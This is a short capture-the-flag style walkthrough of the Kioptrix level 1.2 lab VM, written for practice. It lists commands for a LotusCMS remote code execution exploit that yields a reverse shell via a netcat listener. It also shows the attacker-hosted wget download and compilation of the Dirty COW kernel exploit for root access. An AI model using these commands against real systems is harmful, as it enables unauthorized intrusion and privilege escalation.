--------------------------------
# Author Shubham Ranpise
--------------------------------

# 11/december/2022

# Kioptrix level 1.2

----------------------------------------------------------------
# nmap scan (got website on port 80)
----------------------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)

----------------------------------------------------------------
# exploiting vulnerable lotus cms
----------------------------------------------------------------
-> git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit.git   
-> nc -lvnp 6969       
-> ./lotusRCE.sh kioptrix3.com /  
-> $IP
-> $PORT
-> 1
get reverse shell

----------------------------------------------------------------
# exploit vulnerable kernal version to get root access AKA dirty cow
----------------------------------------------------------------
-> uname -r  //2.6.24-24-server vulnerable kernel version
exploit availble on exploitdb https://www.exploit-db.com/exploits/40839

-> python3 -m http.server 80
-> cd /tmp
-> wget http://10.0.2.9:80/40839.c

make interactive shell 
-> python -c 'import pty;pty.spawn("/bin/bash")'

compile and use exploit
-> gcc -pthread 40839.c -o exploit -lcrypt
-> ./exploit "newpassword"
-> su firefart

you got root
----------------------------------------------------------------
# flag
----------------------------------------------------------------
firefart@Kioptrix3:~# cat Congrats.txt
cat Congrats.txt
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone. 
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.


I hope you enjoyed this third challenge.

Steven McElrea
aka loneferret
http://www.kioptrix.com


Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.

Main page CMS: 
http://www.lotuscms.org

Gallery application: 
Gallarific 2.1 - Free Version released October 10, 2009
http://www.gallarific.com
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
http://www.exploit-db.com/exploits/15891/

The HT Editor can be found here:
http://hte.sourceforge.net/downloads.html
And the vulnerable version on Exploit-DB here:
http://www.exploit-db.com/exploits/17083/


Also, all pictures were taken from Google Images, so being part of the
public domain I used them.
